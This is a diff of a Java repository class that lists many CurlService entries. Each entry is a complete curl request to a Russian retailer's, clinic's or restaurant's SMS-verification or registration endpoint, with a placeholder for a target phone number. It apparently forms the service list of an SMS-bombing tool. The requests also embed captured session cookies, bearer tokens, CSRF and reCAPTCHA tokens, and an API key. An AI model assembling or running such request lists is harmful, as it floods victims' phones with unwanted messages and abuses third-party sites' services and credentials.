-                        "  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmNmI2ZDU1My01MGQwLTQyMzItOWZlZS1mYWE3Yjg4MTU5MzIiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiODQxNzQ5OGItM2RlOS00ZWYxLWE1OTQtODM0NzlkNmRmOTU4IiwiZGV2aWNlaWQiOiJiMzQzNzFmZmRlZmJmYzM4OTFlYWIyZDU0YjAyMjNmYyIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2ODMyMjU0NjIsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.ZNmhsEK77LU-5MsGizOyE1wedqszPZjfZ-iWTLUD1X8' \\\n" +
-                        "  -H 'Connection: keep-alive' \\\n" +
-                        "  -H 'Content-Type: application/json' \\\n" +
-                        "  -H 'Cookie: __ddg1_=qO4XZHQDxHvjRPmZFhmv; _ga_JL7GJBGZYH=GS1.1.1683218262.1.0.1683218262.60.0.0; _ym_uid=168321826321248194; _ym_d=1683218263; _ga=GA1.2.1496860973.1683218263; _gid=GA1.2.1041811607.1683218263; _gat_UA-55318952-1=1; _gat_UA-56721552-1=1; _ym_isad=2; _ym_visorc=b; call_s=%3C\\u0021%3E%7B%22qo1q7a6x%22%3A%5B1683220062%2C1826528831%2C%7B%22258661%22%3A%22782951%22%7D%5D%2C%22d%22%3A2%7D%3C\\u0021%3E; deviceId=b34371ffdefbfc3891eab2d54b0223fc; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmNmI2ZDU1My01MGQwLTQyMzItOWZlZS1mYWE3Yjg4MTU5MzIiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiODQxNzQ5OGItM2RlOS00ZWYxLWE1OTQtODM0NzlkNmRmOTU4IiwiZGV2aWNlaWQiOiJiMzQzNzFmZmRlZmJmYzM4OTFlYWIyZDU0YjAyMjNmYyIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2ODMyMjU0NjIsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.ZNmhsEK77LU-5MsGizOyE1wedqszPZjfZ-iWTLUD1X8; tmr_lvid=86bb6faf31d9a8c3346c87984efa5dd8; tmr_lvidTS=1683218263860; advcake_track_id=2d786c2d-5714-81c9-d168-3e8dd2730508; advcake_session_id=da4646da-1566-0778-20b5-3f6680a85cbf; amp_ff4b07=54yGiyOlbsdG4QYzDJZTlG...1gvjq0s0n.1gvjq0s0q.1.0.1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; adrdel=1; adrcid=AoperZLPuANMfaxNNExWeOA; analytic_id=1683218266303917' \\\n" +
-                        "  -H 'Origin: https://auth.leomax.ru' \\\n" +
-                        "  -H 'Referer: https://auth.leomax.ru/' \\\n" +
-                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
-                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
-                        "  -H 'Sec-Fetch-Site: same-site' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  --data-raw '{\"phone\":\"+{full_phone}\"}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://mid-new-prod.doctis.ru/api/v2/Account/StartRegister' \\\n" +
-                        "  -H 'authority: mid-new-prod.doctis.ru' \\\n" +
-                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/json' \\\n" +
-                        "  -H 'origin: https://lk.mamadeti.ru' \\\n" +
-                        "  -H 'referer: https://lk.mamadeti.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: cross-site' \\\n" +
-                        "  --data-raw '{\"phone\":\"{phone:+7 *** ***-**-**}\"}' \\\n" +
                         "  --compressed", 7),
 
                 new CurlService("curl 'https://www.sportdepo.ru/auth/?login=yes&ajax=Y' \\\n" +
@@ -2073,43 +1634,6 @@ public class DefaultRepository implements ServicesRepository {
                         "  --data-raw 'AUTH_FORM_SMS=Y&AUTH_FORM_SMS_ACTION=send&backurl=%2Fauth%2F&USER_PHONE=%2B{phone:7+(***)+***-**-**}&AUTH_SMS_CODE=' \\\n" +
                         "  --compressed", 7),
 
-                new CurlService("curl 'https://lk.restamanagement.ru/api/auth/register' \\\n" +
-                        "  -H 'Accept: application/json' \\\n" +
-                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'Connection: keep-alive' \\\n" +
-                        "  -H 'Content-Type: application/json' \\\n" +
-                        "  -H 'Cookie: _ga_FQ1TPWMWQK=GS1.1.1683456068.1.0.1683456068.0.0.0; _ga=GA1.2.1244155059.1683456069; _gid=GA1.2.327998884.1683456069; _gat_gtag_UA_119464362_15=1; _ym_uid=168345607076911489; _ym_d=1683456070; _ym_isad=2; _ym_visorc=w' \\\n" +
-                        "  -H 'Origin: https://lk.restamanagement.ru' \\\n" +
-                        "  -H 'Referer: https://lk.restamanagement.ru/registration' \\\n" +
-                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
-                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
-                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  --data-raw '{\"id\":\"\",\"phone\":\"+{phone:7 (***) *** ** **}\",\"password\":\"qwertyuiop\",\"passwordConfirm\":\"qwertyuiop\",\"sender\":4,\"remember\":true,\"agreement\":true,\"reCAPTCHA\":\"03AL8dmw8IGwThScmZ1QEBalHC49hVFWUgtAtquBPGT3WOyplmBmOJn_alRGPTBXCKdRvVFsPsciLfFz4UdwJ8yYyiqTxdUH02y1CX1iqKJA3MTC7u-iY7j27XGu9fIoTZ_CQV3HIabxgJJskOWETskViC4GsQlyE9H5r4ORMuY2hBCoYO5Q0XkbZ6CrA-DIPI6dLAtm-pQyHXsFfslqF4zm-zexi1mjgq5NuCvqa9KiQX_iLUtrIe2DYi3hgYw81mQ4cjbyGt0ZQr8eDGJY7P3Chcv3PefsMFCVIlT-BhGSlqrhYKFI-gzEhqqa86WDu-EXmO8VE09J3T12YlUUD-nvuufyewYHF9FnCxIiJ6IE1nsa7pFNz1qX_L54eVL-2nNMjDT0Vh_yzvMJGppwVo-06F95wc1onmrpZXmLGwiJRp7xECvCRamVaU2_cLo9EJiNL1S5RXlXXN9fds6pda4dDfLIKfCzMCovKY8BqUYd73U1Mv7qviL4DvGIoHtbu0EWF4zwlfuZkEP4ky9scRI1TGPOnR6VTAcUugBUw_ei7aV9IJqGDkerU\",\"connectionId\":\"KevNkdDkmSbBC9wDqfavnA\"}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://xn----8sbpjmk6aq9b.xn--p1ai/checkPhone' \\\n" +
-                        "  -H 'authority: xn----8sbpjmk6aq9b.xn--p1ai' \\\n" +
-                        "  -H 'accept: application/json' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'authorization: bearer null' \\\n" +
-                        "  -H 'content-type: application/json;charset=UTF-8' \\\n" +
-                        "  -H 'cookie: sushimake_session=eyJpdiI6IkVSd2JkcEdYWnU1ZnF6NTltSjBRMEE9PSIsInZhbHVlIjoib0t6WjVVb09ra05DVHRONmJSRzdqb0lHeWlBYzZXaFV0K1gvcEFqbUJqaVBsWWlQeUZVZmI2YVhkaHZBNWwyS3NaQ01EZmxiMjU4SW1yVHUyajNjT1dkRlVtNnBUUy9WT2MveHRtS1h6NjEzTEE4dktiNU8rQ0JIaXpIaGlTSWwiLCJtYWMiOiIyNDFhZTg1YzIzMDQ2MzBmYzAzODZhYjc4YTQ0NGVmZjFmYjAzYzA4MDJmMjU2MzE0NTRjYzVhMjA5NjY3MjVkIn0%3D; Zcy6hxc1A0EnYMuzKmmQ6k90Vy4pxJM2sE7xW4RX=eyJpdiI6ImRnNERqYnZRS0FQM1NReUVZc2VqaVE9PSIsInZhbHVlIjoiOHV3ckpCN2RaelhnVHZwT2dKUWlYOHd4Y082NHJmSVdUS3o4eFM3T3IwMk1IYXdFNWxpNjRWb2FwRWxFS2FUUStDQytsWGt3c1dOaml2VnBMTWpCQlBkbURhSFJoa2RFWmtQb2cwOVE2eEhLVWI3SEZ0aEJBK3NJRzNrV1lZL3JoR0U3c3Q0eGUwLzd5Skkyb05tdjhWVlRGVjN4NVl0WVEwbUYzRVA2bCtrem1pZEloSG5UNGdBZk1MR29qMDNSSjJDeXBWWk5WeDVIM0NhL3gzZHJUWlk2S0UwMGw2VzdjZisrWEZSWFVuaW84UnprNzhUaDJjd3FvNjdyM0lPNFBBbGdnN2V3WE0rdjhWMGFaTmVCUHRDVEJ1U3VZekdTYlRvcElxR0lFZHI3VGlabFdHYllFRllzRU9wWFRzWmZqY295emhFbmlzdEFjUGdHTlFGekhXRC9IQnhsS3hid04wYUhLaDcwSFB4c01qbmdUVHlCUTcrd1NidWxwU3RFIiwibWFjIjoiZDAyMWI3MTFkNmE5MWI5OGEzZWYyNGUxNmJkY2NiNDdjYjQwNzMzMzFhYjAxMTdkMDllN2VkZTRkMGI5YTk3NCJ9; _ga_CZP03407E0=GS1.1.1683456340.1.0.1683456340.0.0.0; _ga=GA1.2.243452895.1683456341; _gid=GA1.2.1501238963.1683456341; _gat_gtag_UA_192269048_1=1; tmr_lvid=4e4971e2a993160b9dbf32e2b54dbf6e; tmr_lvidTS=1683456341712; _fbp=fb.1.1683456341968.1135216328; _ym_uid=1683456343586258782; _ym_d=1683456343; _ym_visorc=w; _ym_isad=2; tmr_detect=0%7C1683456344007; usescookie=true' \\\n" +
-                        "  -H 'origin: https://xn----8sbpjmk6aq9b.xn--p1ai' \\\n" +
-                        "  -H 'referer: https://xn----8sbpjmk6aq9b.xn--p1ai/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'x-csrf-token: cNFConBGuBkSk3RCsbQkoXZ5jFZudBmdwcYZ5Gsl' \\\n" +
-                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                        "  --data-raw '{\"phone\":\"{full_phone}\",\"recaptcha\":\"03AL8dmw_W1R260z1oIX_vKqV31r4Fkv_r9tadJo1V1wYFBJYREZf7DCAC9Yd2BseOiOmk-4aCYQlcTL0AJAUCWUkA6zDrxFfZ96H_uh71GtPXZcMPxOjXWObkqQBlUJWm__-XGnbGvt7mxyqkPbsfoEHP1L40NX6RdUwleBjpmpGnFay5Gea8Hm-m3aKYYVoj66o9PZGW738tke_EjQWCCpi1pJEVzb1eztauckUX4OpFkuvhQtyAkvHHtI48AaKg4SSjOfkrgdOXKGlD3_giQl-sthYGfNImKQLBpyRz6ldrJiu4oLExIj4AHEwGu763A0D34S6CAgi1pqsDzmx-92LmSkJq6H4yMlFoo3Cm7Io5G8xHqMbvlBxme36xlLmsA7tvTNRvhGilUfTOo7EinBjEQ_XbeSTyI96OS6EYdhIVjLgSnklshGeNlQfxzG-WJKm2xAkuXWiyJRbm0BrhlcAORvvEmAmYV1rG1-IYuO10b32lxdqjjHt1frpFz-Skg9_Db68P40TvMPJV172pMRwkOCSZUozHOqCoBSPj0NEApvyMW4OiKdU\"}' \\\n" +
-                        "  --compressed", 7),
-
                 new CurlService("curl 'https://mybile.secret-kitchen.ru/api/v1/sms/send_code' \\\n" +
                         "  -H 'Accept: */*' \\\n" +
                         "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
@@ -2127,24 +1651,6 @@ public class DefaultRepository implements ServicesRepository {
                         "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                         "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                         "  --data-raw '{\"phone\":\"{phone}\",\"type\":\"auth\",\"apiKey\":\"eb2090ca404dbf4d52b42e1221392ff02193ee9f4b81e67262dbc39e72d3170b\"}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://mir-sporta.com/signup/' \\\n" +
-                        "  -H 'Accept: */*' \\\n" +
-                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'Connection: keep-alive' \\\n" +
-                        "  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
-                        "  -H 'Cookie: is_mobile=true; PHPSESSID=vq6aetk0a9h0j8d9suioje3bgm; referer=https%3A%2F%2Fwww.google.com%2F; landing=%2F; shop_regions_env_key=645781563663d6.23853570; utm=%7B%22source%22%3A%22google%22%7D; marquiz__url_params=%7B%22utm_source%22%3A%22google%22%7D; visited=true; _ga=GA1.1.1511665671.1683456500; tmr_lvid=d9170a17def0345867921a630b53eff7; tmr_lvidTS=1683456500839; roistat_visit=5651427; roistat_first_visit=5651427; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_uid=UI4rfTbDZit7A2T69T9k; mgo_cnt=1; mgo_sid=8o1gruabcl11001ojv0f; _ru_yandex_autofill=long_time_no_see; _ym_uid=1683456502271103502; _ym_d=1683456502; _ym_isad=2; _ym_visorc=w; roistat_marker=seo_google_; roistat_marker_old=seo_google_; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit%2Croistat_marker%2Croistat_marker_old; ___dc=7b8ce2f7-ad59-4636-a303-dd8d4cfe6975; is_mobile=true; _ga_ZDQPPXGNJK=GS1.1.1683456500.1.1.1683456508.52.0.0; ab_id=c3b5a5d6621baca65c1e959c5dcb31dd4cff20aa; mgo_sb_session=pgs%253D4%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fmir-sporta.com%252Fsignup%252F; tmr_detect=0%7C1683456511127' \\\n" +
-                        "  -H 'Origin: https://mir-sporta.com' \\\n" +
-                        "  -H 'Referer: https://mir-sporta.com/signup/' \\\n" +
-                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
-                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
-                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
-                        "  -H 'X-Requested-With: XMLHttpRequest' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  --data-raw 'data%5Bfirstname%5D=gewerger&data%5Bphone%5D=%2B{phone:7+(***)+***-**-**}&wa_json_mode=1&need_redirects=1&contact_type=person' \\\n" +
                         "  --compressed", 7),
 
                 new CurlService("curl 'https://kingsushi.pro/api/auth/sms' \\\n" +
@@ -2184,25 +1690,6 @@ public class DefaultRepository implements ServicesRepository {
                         "  -H 'usedapiversion: 6' \\\n" +
                         "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                         "  --data-raw '\"+{full_phone}\"' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://vl.pizza-prosto.ru/api/?action=confirm-phone&city=vl' \\\n" +
-                        "  -H 'authority: vl.pizza-prosto.ru' \\\n" +
-                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/json' \\\n" +
-                        "  -H 'cookie: __cf_bm=ksR8PZ1YhDjkdFbSopUar3Bq2VPu9udTGHiY2m.ALU0-1683457666-0-AUPUAiEdQRe3dnnwSJUhrt7znCy970aX0mOIrBRIZ69mRiLulriNADCynAl2Bs5FLDEE7bA64jv5HlvbsZlZXQYK9QKjP5v5nP+PAMyVBplf; _ym_uid=168345766647670538; _ym_d=1683457666; _ym_isad=2; _ym_visorc=w; PHPSESSID=CdgwDxgIuCk6YflYj70xulp3SMveT0PG; APP_DOWNLOAD=Y; _ga=GA1.2.578830437.1683457668; _gid=GA1.2.251775189.1683457668; _gat=1; _gat_gtag_UA_99839605_1=1; _gat_UA-99839605-1=1; app-lang=ru; tmr_lvid=40bcb326676fd582e1f6c3985c1bfcd6; tmr_lvidTS=1683457668709; SITE_LANG=ru; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; iiko_card_token=ENxzeU30G7nZkygjkHwW4OBSciTkAoLjlGoxRXv0tbkQr_V5yzDbC78RPkg64Q4JubkN9z8Cx2iYqxuMjRKPnA2; _ga=GA1.3.578830437.1683457668; _gid=GA1.3.251775189.1683457668; tmr_detect=0%7C1683457671384' \\\n" +
-                        "  -H 'origin: https://vl.pizza-prosto.ru' \\\n" +
-                        "  -H 'referer: https://vl.pizza-prosto.ru/?cityname=vl' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                        "  -H 'x-bitrix-csrf-token: 0800655d65e774e0508fdc8ed8d849fa' \\\n" +
-                        "  --data-raw '{\"phone\":\"+{phone:7 (***) ***-**-**}\",\"devMode\":false}' \\\n" +
                         "  --compressed", 7),
 
                 new CurlService("curl 'https://shop.gretta.ru/module/kbmobilelogin/verification' \\\n" +
@@ -2262,101 +1749,6 @@ public class DefaultRepository implements ServicesRepository {
                         "  --data-raw 'phone=%2B{phone:7+***+***+****}' \\\n" +
                         "  --compressed", 7),
 
-                new CurlService("curl 'https://ruvape.ru/smsc.php' \\\n" +
-                        "  -H 'authority: ruvape.ru' \\\n" +
-                        "  -H 'accept: text/html, */*; q=0.01' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
-                        "  -H 'cookie: _ym_uid=1683461611212840060; _ym_d=1683461611; _ym_visorc=w; _ym_isad=2; word=t; verification_code=7047' \\\n" +
-                        "  -H 'origin: https://ruvape.ru' \\\n" +
-                        "  -H 'referer: https://ruvape.ru/signup/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                        "  --data-raw 'phoneNumber=%2B{phone:7+(***)+***-**-**}&code=7047' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://istnova.ru/local/templates/istnova/components/bitrix/system.auth.authorize/flat/ajax_phone.php' \\\n" +
-                        "  -H 'authority: istnova.ru' \\\n" +
-                        "  -H 'accept: */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: text/plain;charset=UTF-8' \\\n" +
-                        "  -H 'cookie: PHPSESSID=LUc7My3OXNDqI9Qy30MdTK0NgFlpC2cr; BITRIX_SM_GUEST_ID=5902397; BITRIX_SM_LAST_ADV=5_Y; BITRIX_SM_SALE_UID=045c1b28557a3630c14280a7a906f0ab; _ym_uid=1683470306671026224; _gid=GA1.2.1090755213.1683470306; _ga_cid=1192191747.1683470306; _gat_UA-155203662-1=1; _ym_isad=2; _ym_visorc=w; tmr_lvid=88656b838b4cb2692d4a79fb2f2b7221; tmr_lvidTS=1683470306552; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _fbp=fb.1.1683470306684.535119077; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A23%2C%22EXPIRE%22%3A1683493140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BITRIX_SM_LAST_VISIT=07.05.2023%2017%3A38%3A29; _ga_GDZJZY5RQY=GS1.1.1683470306.1.0.1683470309.0.0.0; _ga=GA1.1.1192191747.1683470306; _ym_d=1683470310; tmr_detect=0%7C1683470311578' \\\n" +
-                        "  -H 'origin: https://istnova.ru' \\\n" +
-                        "  -H 'referer: https://istnova.ru/personal/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                        "  --data-raw '{\"phone\":\"+{full_phone}\"}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://moymyasnoy76.ru/ajax/phone_auth.php' \\\n" +
-                        "  -H 'authority: moymyasnoy76.ru' \\\n" +
-                        "  -H 'accept: */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
-                        "  -H 'cookie: PHPSESSID=FJfi6bMzD4BXLXy9kI7me30lZZ2ZDR5Q; BITRIX_SM_SALE_UID=a2447f6e382720fdc4ab7800b420ff2e; BITRIX_SM_TZ=Europe/Moscow; _ym_debug=null; BITRIX_CONVERSION_CONTEXT_s2=%7B%22ID%22%3A19%2C%22EXPIRE%22%3A1683493140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; searchbooster_v2_user_id=AFYuqv6IjR4kYm7J-YsTi_d4NpZUIaLAuYJO_YpP-nR%7C4.7.17.55; ageCheckPopupRedirectUrl=%2Fv2-mount-input; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_uid=1683471349150429049; _ym_d=1683471349; _ym_isad=2; _ym_visorc=w' \\\n" +
-                        "  -H 'origin: https://moymyasnoy76.ru' \\\n" +
-                        "  -H 'referer: https://moymyasnoy76.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                        "  --data-raw 'email_personal=b550b22ed6fa64ac46a7ddf840606699%40email.email&agree_personal=&user_id=&referer=https%3A%2F%2Fmoymyasnoy76.ru%2F&phone=%2B{phone:7(***)***-**-**}&last_name=gewrgwerg&mail=gwergwe%40gmail.com&sogl=Y&code=' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://www.togas.com/ru/customer/ajax/sendRegistrationCode/' \\\n" +
-                        "  -H 'authority: www.togas.com' \\\n" +
-                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
-                        "  -H 'cookie: roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; PHPSESSID=ujb75f80h4790m2ibaptb47k23; X-Magento-Vary=e3cb9ab3566a693edff3edf82caa39b1ed79e8ba; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _gcl_au=1.1.1896780550.1683471550; form_key=7clciuUTl2lcRmh8; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ym_uid=1683471550144780515; _ym_d=1683471550; roistat_visit=7945768; roistat_first_visit=7945768; roistat_visit_cookie_expire=1209600; _ga=GA1.2.288191100.1683471550; _gid=GA1.2.426302552.1683471550; _gat_UA-19037809-1=1; _dc_gtm_UA-19037809-1=1; tmr_lvid=532090a0c9f8c5c552952a2ac6fd596e; tmr_lvidTS=1683471550586; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _ym_visorc=w; _ym_isad=2; _tt_enable_cookie=1; _ttp=JFHg9hR8m4F9UDT9CDO4c0hilaw; flocktory-uuid=84ab2d77-1f78-4e0d-bd20-5135f5ad6978-2; roistat_marker=seo_google_; roistat_marker_old=seo_google_; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit%2Croistat_marker%2Croistat_marker_old; ___dc=b6367dbd-27ff-4926-aba4-fc2145e9132d; form_key=7clciuUTl2lcRmh8; mst-cache-warmer-track=1683471550708; astrio_region_data=%7B%7D; private_content_version=8a192ac68420a46e1785a522776c2af2; region_id=location_2643743; c2d_widget_id={%22102757fb55baf860439e0481da11d834%22:%22[chat]%20981d72e21145aff74406%22}; tmr_detect=0%7C1683471555408; section_data_ids=%7B%7D' \\\n" +
-                        "  -H 'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI4MzM0NTgiLCJhcCI6IjM1MDY0MzQ4MSIsImlkIjoiM2FkYzMyYTA2MmY3NDVkOCIsInRyIjoiZDY5ZWYxZGJkYmIzMWNhZjJjMTRiYzkwOGY5Yjg4MDAiLCJ0aSI6MTY4MzQ3MTU4NjAzNn19' \\\n" +
-                        "  -H 'origin: https://www.togas.com' \\\n" +
-                        "  -H 'referer: https://www.togas.com/ru/customer/account/login/' \\\n" +
